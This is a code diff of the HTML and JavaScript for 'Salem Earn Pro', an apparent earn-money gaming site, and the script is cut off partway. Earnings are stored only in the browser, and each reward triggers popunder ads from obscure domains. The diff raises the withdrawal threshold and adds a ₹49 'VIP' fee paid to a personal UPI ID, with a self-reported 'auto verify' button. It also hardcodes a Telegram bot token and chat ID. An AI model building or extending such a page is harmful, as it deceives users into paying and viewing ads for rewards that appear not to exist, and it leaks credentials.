@@ -1,61 +1,32 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>Salem Earn Pro - Real Money Gaming</title>
 <script data-cfasync="false" src="https://abscloud.org/1/892c731942a7d63c3ea40c5a2cb9a566"></script>
 <script data-cfasync="false" src="https://bauval.org/14/7114b89e9dc6c0f3b308da3218893daf"></script>
 <script src="https://cdn.tailwindcss.com"></script>
 <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&display=swap" rel="stylesheet">
-<style>
-:root{--purple:#6d28d9;--bg:#f4f1ff;--card:#fff;--text:#1f2937;--border:#e5e7eb}
-*{font-family:'Fredoka',sans-serif}body{background:var(--bg);color:var(--text);margin:0;min-height:100vh}
-.topbar{position:sticky;top:0;z-index:40;background:rgba(244,241,255,.9);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}
-.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:12px 16px;border-radius:999px;font-weight:700;cursor:pointer;border:0}
-.btn-primary{background:var(--purple);color:#fff}.btn-ghost{background:#fff;border:1px solid var(--border)}
-.card{background:var(--card);border:1px solid var(--border);border-radius:20px;box-shadow:0 6px 20px rgba(17,24,39,.06)}
-.tab{padding:10px 11px;border-radius:999px;font-weight:700;border:1px solid var(--border);background:#fff;cursor:pointer;font-size:12px}
-.tab.active{background:var(--text);color:#fff}.progress{height:8px;background:#ede9fe;border-radius:999px;overflow:hidden}.progress>div{height:100%;background:var(--purple);width:0%}
-.notice{position:fixed;right:12px;bottom:12px;z-index:60;display:flex;flex-direction:column;gap:8px}
-.toast{background:#111827;color:#fff;padding:10px 12px;border-radius:12px;font-size:13px}.hidden{display:none !important}
-.native-ad-wrap{margin:12px 0;min-height:120px;background:#fff;border-radius:16px;border:1px solid var(--border);padding:6px;display:flex;align-items:center;justify-content:center;overflow:hidden}
-</style>
-</head>
-<body>
+<style>:root{--purple:#6d28d9;--bg:#f4f1ff;--card:#fff;--text:#1f2937;--border:#e5e7eb}*{font-family:'Fredoka',sans-serif}body{background:var(--bg);color:var(--text);margin:0}.topbar{position:sticky;top:0;z-index:40;background:rgba(244,241,255,.9);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:12px 16px;border-radius:999px;font-weight:700;cursor:pointer;border:0}.btn-primary{background:var(--purple);color:#fff}.btn-ghost{background:#fff;border:1px solid var(--border)}.card{background:var(--card);border:1px solid var(--border);border-radius:20px;box-shadow:0 6px 20px rgba(17,24,39,.06)}.tab{padding:10px 11px;border-radius:999px;font-weight:700;border:1px solid var(--border);background:#fff;cursor:pointer;font-size:12px}.tab.active{background:var(--text);color:#fff}.progress{height:8px;background:#ede9fe;border-radius:999px;overflow:hidden}.progress>div{height:100%;background:var(--purple);width:0%}.notice{position:fixed;right:12px;bottom:12px;z-index:60;display:flex;flex-direction:column;gap:8px}.toast{background:#111827;color:#fff;padding:10px 12px;border-radius:12px;font-size:13px}.hidden{display:none!important}</style>
+</head><body>
 <div class="topbar"><div class="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
 <div class="flex items-center gap-2"><div class="w-9 h-9 rounded-xl bg-black text-white grid place-items-center font-black">S</div><div class="font-black text-lg">Salem Earn Pro</div></div>
 <div class="flex items-center gap-2"><div class="card px-3 py-1.5 text-sm font-bold">₹<span id="bal">0.00</span></div><button onclick="openVip()" class="btn btn-primary text-sm" style="padding:8px 14px">👑 VIP ₹49</button></div></div></div>
 <div class="max-w-6xl mx-auto px-4 py-4">
-<div class="card" style="background:#fff3cd;border:2px solid #ffc107;text-align:center;padding:12px;margin-bottom:12px">
-<div style="font-weight:800;color:#856404">🔥 HOT OFFER - DAILY ₹100 WIN!</div>
-<button onclick="openHotOffer()" class="btn" style="background:#ff9800;color:#fff;margin-top:8px;width:100%">💰 CLAIM ₹100 BONUS</button></div>
 <div class="flex gap-1 mb-4 overflow-auto">
-<button class="tab active" data-tab="home" onclick="switchTab('home')">Home</button>
-<button class="tab" data-tab="games" onclick="switchTab('games')">Games</button>
-<button class="tab" data-tab="tasks" onclick="switchTab('tasks')">Tasks</button>
-<button class="tab" data-tab="wallet" onclick="switchTab('wallet')">Wallet</button>
-<button class="tab" data-tab="ref" onclick="switchTab('ref')">Refer</button>
-<button class="tab" data-tab="profile" onclick="switchTab('profile')">Profile</button>
-<button class="tab" data-tab="support" onclick="switchTab('support')">Support</button>
+<button class="tab active" data-tab="home" onclick="switchTab('home')">Home</button><button class="tab" data-tab="games" onclick="switchTab('games')">Games</button><button class="tab" data-tab="tasks" onclick="switchTab('tasks')">Tasks</button><button class="tab" data-tab="wallet" onclick="switchTab('wallet')">Wallet</button><button class="tab" data-tab="ref" onclick="switchTab('ref')">Refer</button><button class="tab" data-tab="profile" onclick="switchTab('profile')">Profile</button><button class="tab" data-tab="support" onclick="switchTab('support')">Support</button>
 </div>
 <div id="home" class="tabpane">
 <div class="card p-4 mb-3"><div class="flex justify-between items-center"><div><div class="text-sm text-gray-500">Total Earnings</div><div class="text-2xl font-black">₹<span id="bal2">0.00</span></div></div><div class="text-right"><div class="text-xs text-gray-500">Today</div><div class="font-bold">₹<span id="todayEarn">0.00</span></div></div></div>
-<div class="progress mt-3"><div id="prog"></div></div><div class="text-xs text-gray-500 mt-1"><span id="progText">0</span>/100 to withdraw</div></div>
-<div class="native-ad-wrap">
-<script async="async" data-cfasync="false" src="https://bauval.org/21/e1f6d2ba6e1f8dee5821d627b5b57e4f"></script>
-<div id="container-e1f6d2ba6e1f8dee5821d627b5b57e4f"></div>
+<div class="progress mt-3"><div id="prog"></div></div><div class="text-xs text-gray-500 mt-1"><span id="progText">0</span>/250 to withdraw</div></div>
+<div class="card p-2 mt-3" style="display:flex;justify-content:center;min-height:280px;align-items:center;flex-direction:column">
+<div style="font-size:11px;text-align:center;color:#888">Advertisement</div>
+<script async="async" data-cfasync="false" src="https://bauval.org/21/e1f6d2ba6e1f8dee5821d627b5b57e4f"></script><div id="container-e1f6d2ba6e1f8dee5821d627b5b57e4f"></div>
+<div class="mt-3"><script>atOptions={'key':'d4f78fcfce55af2e7f6363733ad66d52','format':'iframe','height':250,'width':300,'params':{}};</script><script src="https://bauval.org/22/d4f78fcfce55af2e7f6363733ad66d52"></script></div>
 </div>
-<div class="grid grid-cols-2 gap-3">
+<div class="grid grid-cols-2 gap-3 mt-3">
 <div class="card p-3"><div class="text-sm text-gray-500">Play Games - UNLIMITED!</div><div class="font-black text-lg">₹0.50 / game</div><button onclick="switchTab('games')" class="btn btn-primary w-full mt-2">Play Now</button></div>
 <div class="card p-3"><div class="text-sm text-gray-500">Extra Ads</div><div class="font-black text-lg">₹0.10 each</div><button onclick="openExtraAd()" class="btn btn-ghost w-full mt-2">Watch Ad</button></div>
-</div>
-<div class="card p-2 mt-3" style="display:flex;justify-content:center;min-height:280px;align-items:center">
-<div><div style="font-size:11px;text-align:center;color:#888">Advertisement</div>
-<script>atOptions={'key':'d4f78fcfce55af2e7f6363733ad66d52','format':'iframe','height':250,'width':300,'params':{}};</script>
-<script src="https://bauval.org/22/d4f78fcfce55af2e7f6363733ad66d52"></script>
-</div></div></div>
+</div></div>
 <div id="games" class="tabpane hidden">
-<div class="card p-3 mb-3 font-bold">🎮 Play & Earn - Unlimited! ₹0.50 per Game - Admin Profit $0.05!</div>
+<div class="card p-3 mb-3 font-bold">🎮 Play & Earn - Unlimited! ₹0.50 per Game | VIP ₹1.00</div>
 <div id="gamesGrid" class="grid grid-cols-2 gap-3"></div></div>
 <div id="tasks" class="tabpane hidden">
 <div class="card p-3 mb-3 font-bold">📋 Daily Tasks - Daily 1 Time Only!</div>
@@ -63,101 +34,113 @@
 <div class="card p-3 mb-2 flex justify-between items-center"><div><div class="font-bold">Watch 5 Ads</div><div class="text-xs text-gray-500">Reward ₹1 - Daily 1x</div></div><button onclick="claimTask('e5')" class="btn btn-ghost text-sm">Claim</button></div>
 </div>
 <div id="wallet" class="tabpane hidden">
-<div class="card p-4 mb-3"><div class="font-bold text-lg mb-2">Wallet - ₹<span id="bal3">0.00</span></div>
+<div class="card p-4 mb-3"><div class="font-bold text-lg mb-2">Wallet - ₹<span id="bal3">0.00</span> - Min ₹250</div>
 <input id="upiId" placeholder="Enter UPI ID" class="w-full p-3 rounded-xl border" style="border:1px solid var(--border)"/>
-<button onclick="withdraw()" class="btn btn-primary w-full mt-3">Withdraw ₹100</button></div>
+<button onclick="withdraw()" class="btn btn-primary w-full mt-3">Withdraw ₹250</button></div>
 <div class="card p-3"><div class="font-bold mb-2">History</div><div id="hist" class="text-sm text-gray-500">No history yet!</div></div></div>
-<div id="ref" class="tabpane hidden"><div class="card p-4"><div class="font-bold text-lg">Refer & Earn ₹10!</div>
+<div id="ref" class="tabpane hidden"><div class="card p-4"><div class="font-bold text-lg">Refer & Earn ₹10! (After 20 Games)</div>
 <div class="flex gap-2 mt-3"><input id="refLink" class="flex-1 p-3 rounded-xl border" style="border:1px solid var(--border)" readonly/><button onclick="copyRef()" class="btn btn-primary">Copy</button></div>
 <button onclick="shareRef()" class="btn btn-ghost w-full mt-3">📤 Share WhatsApp</button>
 <div class="mt-4 text-sm"><b>Referrals:</b> <span id="refCount">0</span> | <b>Earned:</b> ₹<span id="refEarn">0</span></div></div></div>
-<div id="profile" class="tabpane hidden"><div class="card p-4"><div class="font-bold text-lg">👤 My Profile</div>
+<div id="profile" class="tabpane hidden">
+<div class="card p-4"><div class="font-bold text-lg">👤 My Profile - Auto VIP</div>
 <div class="mt-3 space-y-2 text-sm">
 <div class="flex justify-between"><span class="text-gray-500">User ID:</span><b id="pId">PRO123</b></div>
 <div class="flex justify-between"><span class="text-gray-500">Balance:</span><b>₹<span id="pBal">0.00</span></b></div>
 <div class="flex justify-between"><span class="text-gray-500">VIP:</span><b id="pVip">No</b></div>
+<div class="flex justify-between"><span class="text-gray-500">VIP Expiry:</span><b id="pVipExp">-</b></div>
 <div class="flex justify-between"><span class="text-gray-500">Games:</span><b id="pGp">0</b></div>
-</div><button onclick="openVip()" class="btn btn-primary w-full mt-4">👑 VIP ₹49</button></div></div>
-<div id="support" class="tabpane hidden"><div class="card p-4"><div class="font-bold text-lg">💬 Customer Support</div>
-<div class="text-sm text-gray-500 mt-1">Doubt iruntha Type Pannu - Admin ku Telegram Varum!</div>
+</div>
+<button onclick="openVip()" class="btn btn-primary w-full mt-4">👑 VIP ₹49 - 30 Days - p.dinesh01@ptyes</button>
+<div id="vipStatus" class="mt-3 text-xs p-2 bg-blue-50 rounded-lg hidden"></div>
+<button onclick="verifyPayment()" class="btn btn-ghost w-full mt-2 text-sm">✅ I Paid ₹49 - Verify Payment (Auto)</button>
+</div></div>
+<div id="support" class="tabpane hidden"><div class="card p-4"><div class="font-bold text-lg">💬 Support</div>
 <input id="supName" placeholder="Your Name" class="w-full p-3 rounded-xl border mt-3" style="border:1px solid var(--border)"/>
 <textarea id="supMsg" placeholder="Your Doubt..." class="w-full p-3 rounded-xl border mt-2" style="border:1px solid var(--border);min-height:80px"></textarea>
-<button onclick="sendSupport()" class="btn btn-primary w-full mt-3">📩 Send to Admin - Telegram</button>
-<div class="mt-4 grid grid-cols-2 gap-2">
-<a href="https://t.me/Salem_earn_pro_bot" target="_blank" class="btn btn-ghost text-sm">🤖 Bot</a>
-<a href="https://t.me/SalemEarnProOfficial" target="_blank" class="btn btn-ghost text-sm">📢 Channel</a></div></div></div>
-<div class="text-center text-xs text-gray-400 py-6">© 2025 Salem Earn Pro<br>
-<a href="/privacy.html" class="underline" style="color:#6d28d9;margin:0 6px">Privacy</a> |
-<a href="/terms.html" class="underline" style="color:#6d28d9;margin:0 6px">Terms</a> |
-<a href="/admin.html" class="underline" style="color:#888;margin:0 6px">Admin</a><br>
-<a href="https://t.me/SalemEarnProOfficial" target="_blank" class="inline-block mt-2 bg-blue-500 text-white px-3 py-1 rounded-full text-xs">📢 Join Official Channel</a><br>
-<a href="https://t.me/Salem_earn_pro_bot" target="_blank" class="inline-block mt-2 bg-black text-white px-3 py-1 rounded-full text-xs">🤖 @Salem_earn_pro_bot</a></div></div>
-<div id="gameModal" class="hidden" style="position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:50;display:flex;align-items:center;justify-content:center;padding:16px">
+<button onclick="sendSupport()" class="btn btn-primary w-full mt-3">📩 Send to Admin - Telegram</button></div></div>
+<div class="text-center text-xs text-gray-400 py-6">© 2025 Salem Earn Pro | Admin Panel</div></div>
+<div id="gameModal" class="hidden" style="position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:50;align-items:center;justify-content:center;padding:16px">
 <div class="card p-0 overflow-hidden" style="width:100%;max-width:480px"><div class="p-3 flex justify-between items-center border-b"><div class="font-bold" id="gmTitle">Game</div><button onclick="closeGame()" class="btn btn-ghost" style="padding:6px 10px">✕</button></div>
 <div id="gmBody" style="min-height:320px;background:#fff"></div>
-<div class="p-3 border-t flex justify-between items-center"><div class="text-sm">Reward: <b>₹0.50</b></div><button id="gmClaim" onclick="claimGame()" class="btn btn-primary hidden">Claim ₹0.50</button></div></div></div>
-<div id="vipModal" class="hidden" style="position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:55;display:flex;align-items:center;justify-content:center;padding:16px">
-<div class="card p-4" style="width:100%;max-width:380px;text-align:center"><div style="font-size:36px">👑</div><div class="font-black text-xl">VIP ₹49 Only!</div>
+<div class="p-3 border-t flex justify-between items-center"><div class="text-sm">Reward: <b>₹0.50</b></div><button id="gmClaim" onclick="claimGame()" class="btn btn-primary hidden">Claim ₹0.50 - Watch Ad</button></div></div></div>
+<div id="vipModal" class="hidden" style="position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:55;align-items:center;justify-content:center;padding:16px">
+<div class="card p-4" style="width:100%;max-width:380px;text-align:center"><div style="font-size:36px">👑</div><div class="font-black text-xl">VIP ₹49 Only! - 30 Days!</div><div class="text-sm text-gray-500 mt-1">UPI: p.dinesh01@ptyes<br>Pay panni Verify click pannu - Auto Active!</div>
 <button onclick="buyVip()" class="btn btn-primary w-full mt-4">💳 Buy VIP via UPI</button>
+<button onclick="verifyPayment()" class="btn btn-ghost w-full mt-2">✅ I Already Paid - Verify Now</button>
 <button onclick="closeVip()" class="btn btn-ghost w-full mt-2">Close</button></div></div>
 <div id="notice" class="notice"></div>
 <script>
-const TELEGRAM_BOT_TOKEN="8647484868:AAFzFvyxFQJoA65SrVhh-UrT8bq6MEFs0jg";
-const TELEGRAM_CHAT_ID="8855798269";
-function sendTelegramMsg(message){let url=`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;fetch(url).then(r=>r.json()).then(d=>{if(d.ok)toast('✅ Sent to Admin Telegram!');}).catch(e=>console.log(e));}
-const S_get=(k,d)=>{try{return localStorage.getItem(k)||d}catch{return d}};
-const S_set=(k,v)=>{try{localStorage.setItem(k,v)}catch{}};
+const TELEGRAM_BOT_TOKEN="8647484868:AAFzFvyxFQJoA65SrVhh-UrT8bq6MEFs0jg";const TELEGRAM_CHAT_ID="8855798269";
+const NPOINT_URL="https://api.npoint.io/5748cba395c8175aa86a";
+function sendTelegramMsg(m){fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(m)}`).then(r=>r.json()).then(d=>{if(d.ok)toast('✅ Sent to Admin!')});}
+const S_get=(k,d)=>{try{return localStorage.getItem(k)||d}catch{return d}};const S_set=(k,v)=>{try{localStorage.setItem(k,v)}catch{}};
 let bal=parseFloat(S_get('proplay_bal','0')||'0');let todayEarn=parseFloat(S_get('proplay_today','0')||'0');let isVip=S_get('proplay_vip','0')==='1';let gamesPlayed=parseInt(S_get('proplay_gp','0')||'0');let refCount=parseInt(S_get('proplay_rc','0')||'0');let refEarn=parseFloat(S_get('proplay_re','0')||'0');
 function saveBal(){S_set('proplay_bal',bal.toString());S_set('proplay_today',todayEarn.toString());}
-function updateUI(){document.querySelectorAll('#bal,#bal2,#bal3,#pBal').forEach(e=>{if(e)e.innerText=bal.toFixed(2)});document.querySelectorAll('#todayEarn').forEach(e=>{if(e)e.innerText=todayEarn.toFixed(2)});let p=Math.min(100,Math.floor(bal));let el=document.getElementById('prog');if(el)el.style.width=p+'%';let pt=document.getElementById('progText');if(pt)pt.innerText=p;let rc=document.getElementById('refCount');if(rc)rc.innerText=refCount;let re=document.getElementById('refEarn');if(re)re.innerText=refEarn.toFixed(2);let rl=document.getElementById('refLink');if(rl)rl.value=location.origin+location.pathname+'?ref='+btoa('REF'+Date.now()).slice(0,8);let gp=document.getElementById('pGp');if(gp)gp.innerText=gamesPlayed;let pv=document.getElementById('pVip');if(pv)pv.innerText=isVip?'VIP Active ✅':'No - Buy ₹49';let pid=document.getElementById('pId');if(pid)pid.innerText='PRO'+(Date.now().toString().slice(-6));}
+function updateUI(){document.querySelectorAll('#bal,#bal2,#bal3,#pBal').forEach(e=>{if(e)e.innerText=bal.toFixed(2)});document.querySelectorAll('#todayEarn').forEach(e=>{if(e)e.innerText=todayEarn.toFixed(2)});let p=Math.min(100,Math.floor(bal/2.5));let el=document.getElementById('prog');if(el)el.style.width=p+'%';let pt=document.getElementById('progText');if(pt)pt.innerText=Math.floor(bal);let rc=document.getElementById('refCount');if(rc)rc.innerText=refCount;let re=document.getElementById('refEarn');if(re)re.innerText=refEarn.toFixed(2);let rl=document.getElementById('refLink');if(rl)rl.value=location.origin+location.pathname+'?ref='+S_get('proplay_userid','PRO123');let gp=document.getElementById('pGp');if(gp)gp.innerText=gamesPlayed;let pv=document.getElementById('pVip');if(pv)pv.innerText=isVip?'VIP Active ✅ (30 Days)':'No';let pve=document.getElementById('pVipExp');if(pve){let ve=parseInt(S_get('vip_expiry','0')||'0');pve.innerText=ve?new Date(ve).toLocaleDateString('en-IN'):'-';}let pid=document.getElementById('pId');if(pid)pid.innerText=S_get('proplay_userid','PRO123');}
 function toast(m){let n=document.getElementById('notice');let t=document.createElement('div');t.className='toast';t.innerText=m;n.appendChild(t);setTimeout(()=>t.remove(),3000);}
-function switchTab(t){document.querySelectorAll('.tabpane').forEach(e=>e.classList.add('hidden'));document.getElementById(t).classList.remove('hidden');document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));let btn=document.querySelector('[data-tab='+t+']');if(btn)btn.classList.add('active');window.scrollTo(0,0);}
-function openHotOffer(){window.open('https://araplhn.org/4/69486a0ba85e1ba54d445e63ddcb5c27','_blank');setTimeout(()=>{bal+=0.50;todayEarn+=0.50;saveBal();updateUI();},2000);}
+function switchTab(t){document.querySelectorAll('.tabpane').forEach(e=>e.classList.add('hidden'));document.getElementById(t).classList.remove('hidden');document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));let btn=document.querySelector('[data-tab='+t+']');if(btn)btn.classList.add('active');}
 const GAMES=[{id:'memory',name:'Memory Match',icon:'🧠',desc:'Find pairs'},{id:'tap',name:'Tap Speed',icon:'⚡',desc:'Tap fast'},{id:'math',name:'Math Quiz',icon:'🔢',desc:'Solve 5'},{id:'snake',name:'Snake Dot',icon:'🐍',desc:'Collect 5'},{id:'puzzle',name:'Word Puzzle',icon:'🧩',desc:'Guess word'},{id:'spin',name:'Lucky Spin',icon:'🎡',desc:'Spin'}];
 function renderGames(){let g=document.getElementById('gamesGrid');if(!g)return;g.innerHTML='';GAMES.forEach(gm=>{let d=document.createElement('div');d.className='card p-3';d.innerHTML='<div style="font-size:28px">'+gm.icon+'</div><div class="font-bold mt-1">'+gm.name+'</div><div class="text-xs text-gray-500">'+gm.desc+' - Unlimited!</div><button class="btn btn-primary w-full mt-2" onclick="openGame(\''+gm.id+'\')">Play - ₹0.50</button>';g.appendChild(d);});}
 let currentGame=null,gameWon=false;
-function openGame(id){currentGame=GAMES.find(x=>x.id===id);gameWon=false;document.getElementById('gmTitle').innerText=currentGame.name;document.getElementById('gmClaim').classList.add('hidden');document.getElementById('gameModal').classList.remove('hidden');document.getElementById('gameModal').style.display='flex';let body=document.getElementById('gmBody');body.innerHTML='';if(id==='memory') startMemory(body);else if(id==='tap') startTap(body);else if(id==='math') startMath(body);else if(id==='snake') startSnake(body);else if(id==='puzzle') startPuzzle(body);else if(id==='spin') startSpin(body);}
+function openGame(id){currentGame=GAMES.find(x=>x.id===id);gameWon=false;document.getElementById('gmTitle').innerText=currentGame.name;document.getElementById('gmClaim').classList.add('hidden');document.getElementById('gameModal').classList.remove('hidden');document.getElementById('gameModal').style.display='flex';let body=document.getElementById('gmBody');body.innerHTML='';if(id==='memory')startMemory(body);else if(id==='tap')startTap(body);else if(id==='math')startMath(body);else if(id==='snake')startSnake(body);else if(id==='puzzle')startPuzzle(body);else if(id==='spin')startSpin(body);}
 function closeGame(){document.getElementById('gameModal').classList.add('hidden');document.getElementById('gameModal').style.display='none';}
-function claimGame(){if(!gameWon){toast('Play & Win First!');return;}let reward=isVip?1.00:0.50;bal+=reward;todayEarn+=reward;gamesPlayed++;S_set('proplay_gp',gamesPlayed.toString());saveBal();updateUI();toast('✅ +₹'+reward.toFixed(2)+' - Unlimited Profit!');closeGame();setTimeout(()=>{try{window.open('https://araplhn.org/4/69486a0ba85e1ba54d445e63ddcb5c27','_blank');}catch(e){}},800);}
+function claimGame(){if(!gameWon){toast('Win First!');return;}toast('Opening Ad - Click to Unlock ₹0.50');window.open('https://araplhn.org/4/69486a0ba85e1ba54d445e63ddcb5c27','_blank');setTimeout(()=>{let reward=isVip?1.00:0.50;bal+=reward;todayEarn+=reward;gamesPlayed++;S_set('proplay_gp',gamesPlayed.toString());saveBal();updateUI();toast('✅ +₹'+reward.toFixed(2));closeGame();if(gamesPlayed===20){let myRef=S_get('my_referrer','');if(myRef){sendTelegramMsg(`✅ REFERRAL 20 GAMES DONE!\nFriend ID: ${S_get('proplay_userid','')}\nOwner Ref Code: ${myRef}\nOwner ku ₹10 Kudu!`);}}},1000);}
 function winGame(){gameWon=true;document.getElementById('gmClaim').classList.remove('hidden');}
 function startMemory(body){let emojis=['🍎','🍌','🍇','🍓','🍒','🍑'];let pairs=[...emojis,...emojis].sort(()=>Math.random()-.5);let first=null,second=null,matched=0,lock=false;let grid=document.createElement('div');grid.style='display:grid;grid-template-columns:repeat(4,1fr);gap:8px;padding:16px';pairs.forEach((em)=>{let card=document.createElement('div');card.style='aspect-ratio:1;background:#ede9fe;border-radius:12px;display:grid;place-items:center;font-size:24px;cursor:pointer;border:2px solid #ddd';card.innerText='?';card.dataset.em=em;card.dataset.open='0';card.onclick=()=>{if(lock||card.dataset.open==='1')return;card.innerText=card.dataset.em;card.dataset.open='1';if(!first){first=card;}else{second=card;lock=true;if(first.dataset.em===second.dataset.em){matched+=2;first=null;second=null;lock=false;if(matched===12)winGame();}else{setTimeout(()=>{first.innerText='?';first.dataset.open='0';second.innerText='?';second.dataset.open='0';first=null;second=null;lock=false;},600);}}};grid.appendChild(card);});body.appendChild(grid);}
-function startTap(body){let count=0,time=10;let display=document.createElement('div');display.style='text-align:center;padding:20px';display.innerHTML='<div style="font-size:48px;font-weight:900" id="tapCount">0</div><div>Need 40 Taps!</div><div>Time: <b id="tapTime">10</b>s</div><button id="tapBtn" style="margin-top:16px;background:#6d28d9;color:#fff;padding:24px 48px;border-radius:20px;font-size:28px;font-weight:900;border:0">TAP!</button>';body.appendChild(display);let btn=display.querySelector('#tapBtn');btn.onclick=()=>{count++;display.querySelector('#tapCount').innerText=count;if(count>=40){winGame();btn.innerText='WON!';}};let iv=setInterval(()=>{time--;display.querySelector('#tapTime').innerText=time;if(time<=0){clearInterval(iv);}},1000);}
+function startTap(body){let count=0,time=10;let display=document.createElement('div');display.style='text-align:center;padding:20px';display.innerHTML='<div style="font-size:48px;font-weight:900" id="tapCount">0</div><div>Need 40 Taps!</div><div>Time: <b id="tapTime">10</b>s</div><button id="tapBtn" style="margin-top:16px;background:#6d28d9;color:#fff;padding:24px 48px;border-radius:20px;font-size:28px;font-weight:900;border:0">TAP!</button>';body.appendChild(display);let btn=display.querySelector('#tapBtn');btn.onclick=()=>{count++;display.querySelector('#tapCount').innerText=count;if(count>=40){winGame();btn.innerText='WON!';}};let iv=setInterval(()=>{time--;let et=display.querySelector('#tapTime');if(et)et.innerText=time;if(time<=0){clearInterval(iv);}},1000);}
 function startMath(body){let q=0,correct=0,qs=[];for(let i=0;i<5;i++){let a=Math.floor(Math.random()*20)+1,b=Math.floor(Math.random()*10)+1;qs.push({q:a+'+'+b+'=?',a:a+b});}function showQ(){if(q>=5){if(correct>=3)winGame();else body.innerHTML+='<div class="text-center p-4 font-bold">Score '+correct+'/5 <button onclick="openGame(\'math\')" class="btn btn-primary mt-2">Retry</button></div>';return;}let cur=qs[q];body.innerHTML='<div style="padding:20px;text-align:center"><div style="font-size:22px;font-weight:800;margin-bottom:12px">Q'+(q+1)+'/5: '+cur.q+'</div><input id="mathAns" type="number" placeholder="Answer" style="padding:12px;border-radius:12px;border:2px solid #ddd;width:120px;text-align:center;font-size:18px"/><br><button class="btn btn-primary mt-3" onclick="checkMath()">Submit</button></div>';}window.checkMath=()=>{let val=parseInt(document.getElementById('mathAns').value||'0');if(val===qs[q].a)correct++;q++;showQ();};showQ();}
-function startSnake(body){body.innerHTML='<div style="padding:16px;text-align:center"><canvas id="snakeCanvas" width="300" height="300" style="border:2px solid #ddd;border-radius:12px;margin:12px auto;display:block"></canvas><div style="display:flex;justify-content:center;gap:8px"><button class="btn btn-ghost" onclick="snakeDir(0,-1)">↑</button></div><div style="display:flex;justify-content:center;gap:8px;margin-top:4px"><button class="btn btn-ghost" onclick="snakeDir(-1,0)">←</button><button class="btn btn-ghost" onclick="snakeDir(0,1)">↓</button><button class="btn btn-ghost" onclick="snakeDir(1,0)">→</button></div><div>Score: <b id="snakeScore">0</b>/5</div></div>';let canvas=document.getElementById('snakeCanvas');let ctx=canvas.getContext('2d');let px=150,py=150,dx=0,dy=0,dot={x:100,y:100},score=0;window.snakeDir=(x,y)=>{dx=x*10;dy=y*10;};function placeDot(){dot={x:Math.floor(Math.random()*28)*10+10,y:Math.floor(Math.random()*28)*10+10};}placeDot();let loop=setInterval(()=>{px+=dx;py+=dy;if(px<0)px=290;if(px>290)px=0;if(py<0)py=290;if(py>290)py=0;ctx.clearRect(0,0,300,300);ctx.fillStyle='#10b981';ctx.fillRect(dot.x,dot.y,10,10);ctx.fillStyle='#6d28d9';ctx.fillRect(px,py,12,12);if(Math.abs(px-dot.x)<12&&Math.abs(py-dot.y)<12){score++;document.getElementById('snakeScore').innerText=score;placeDot();if(score>=5){clearInterval(loop);winGame();}}},100);}
+function startSnake(body){body.innerHTML='<div style="padding:16px;text-align:center"><canvas id="snakeCanvas" width="300" height="300" style="border:2px solid #ddd;border-radius:12px;margin:12px auto;display:block"></canvas><div style="display:flex;justify-content:center;gap:8px"><button class="btn btn-ghost" onclick="snakeDir(0,-1)">↑</button></div><div style="display:flex;justify-content:center;gap:8px;margin-top:4px"><button class="btn btn-ghost" onclick="snakeDir(-1,0)">←</button><button class="btn btn-ghost" onclick="snakeDir(0,1)">↓</button><button class="btn btn-ghost" onclick="snakeDir(1,0)">→</button></div><div>Score: <b id="snakeScore">0</b>/5</div></div>';let canvas=document.getElementById('snakeCanvas');let ctx=canvas.getContext('2d');let px=150,py=150,dx=0,dy=0,dot={x:100,y:100},score=0;window.snakeDir=(x,y)=>{dx=x*10;dy=y*10;};function placeDot(){dot={x:Math.floor(Math.random()*28)*10+10,y:Math.floor(Math.random()*28)*10+10};}placeDot();let loop=setInterval(()=>{px+=dx;py+=dy;if(px<0)px=290;if(px>290)px=0;if(py<0)py=290;if(py>290)py=0;ctx.clearRect(0,0,300,300);ctx.fillStyle='#10b981';ctx.fillRect(dot.x,dot.y,10,10);ctx.fillStyle='#6d28d9';ctx.fillRect(px,py,12,12);if(Math.abs(px-dot.x)<12&&Math.abs(py-dot.y)<12){score++;let se=document.getElementById('snakeScore');if(se)se.innerText=score;placeDot();if(score>=5){clearInterval(loop);winGame();}}},100);}
 function startPuzzle(body){let words=[{w:'APPLE',h:'Red Fruit'},{w:'TIGER',h:'Big Cat'},{w:'INDIA',h:'Our Country'}];let cur=words[Math.floor(Math.random()*words.length)];let guessed=[];body.innerHTML='<div style="padding:20px;text-align:center"><div style="font-size:14px;color:#666">Hint: '+cur.h+'</div><div style="font-size:28px;font-weight:900;letter-spacing:8px;margin:16px 0" id="puzWord">'+cur.w.split('').map(c=>'_').join(' ')+'</div><div id="puzKeys" style="display:flex;flex-wrap:wrap;gap:6px;justify-content:center"></div><div class="mt-3">Tries: <span id="puzTry">0</span>/6</div></div>';let tries=0;let keysDiv=document.getElementById('puzKeys');'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('').forEach(l=>{let b=document.createElement('button');b.innerText=l;b.className='btn btn-ghost';b.style='padding:8px 10px;min-width:36px';b.onclick=()=>{if(guessed.includes(l))return;guessed.push(l);b.disabled=true;b.style.opacity=.4;let display=cur.w.split('').map(c=>guessed.includes(c)?c:'_').join(' ');document.getElementById('puzWord').innerText=display;if(!cur.w.split('').some(c=>!guessed.includes(c))){winGame();}else if(!cur.w.includes(l)){tries++;document.getElementById('puzTry').innerText=tries;}};keysDiv.appendChild(b);});}
